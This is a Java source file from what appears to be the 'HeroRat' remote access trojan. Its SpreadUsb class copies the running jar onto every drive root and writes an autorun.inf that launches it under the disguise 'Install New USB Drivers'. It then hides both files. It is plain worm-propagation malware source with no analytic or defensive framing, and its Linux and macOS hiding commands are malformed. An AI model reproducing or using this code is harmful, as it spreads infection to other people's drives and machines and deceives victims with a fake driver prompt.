package net.herorat.features.spread;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.OutputStream;

public class SpreadUsb
{
	public static void spread()
	{
		File[] roots = File.listRoots();
		BufferedWriter buffer = null;
		
		String os = System.getProperty("os.name", "").toLowerCase();
		
		for (File f : roots)
		{
			try
			{
				File jarFile = new File(SpreadUsb.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			
				// Create a new autorun.inf file
				buffer = new BufferedWriter(new FileWriter(f.toString() + "\\autorun.inf"));
				buffer.write("[autorun]");
				buffer.newLine();
				buffer.write("open=" + jarFile.getName());
				buffer.newLine();
				buffer.write("action=Install New USB Drivers");
				buffer.newLine();
				buffer.close();
				
				// Copy the jar file to the disk
				File new_jar = new File(f.toString() + "\\" + jarFile.getName());
				InputStream in = new FileInputStream(jarFile);
				OutputStream out = new FileOutputStream(new_jar);
				byte[] buf = new byte[1024];
				int len;
				while ((len = in.read(buf)) > 0)
				{
					out.write(buf, 0, len);
				}
				in.close();
				out.close();
				
				// Disable rendering on both files
				if (os.contains("win"))
				{
					Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C", "attrib", "+h", f.toString() + "\\Driver.jar"});
					Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C", "attrib", "+h", f.toString() + "\\autorun.inf"});
				}
				else if (os.contains("nux"))
				{
					Runtime.getRuntime().exec(new String[]{"/bin/bash", "attrib", "+h", f.toString() + "\\Driver.jar"});
					Runtime.getRuntime().exec(new String[]{"/bin/bash", "attrib", "+h", f.toString() + "\\autorun.inf"});
				}
				else if (os.contains("mac"))
				{
					Runtime.getRuntime().exec(new String[]{"/usr/bin/open", "-a", "chflags", "hidden", f.toString() + "\\Driver.jar"});
					Runtime.getRuntime().exec(new String[]{"/usr/bin/open", "-a", "chflags", "hidden", f.toString() + "\\autorun.inf"});
				}
			}
			catch (Exception e)
			{
				continue;
			}
		}
	}
}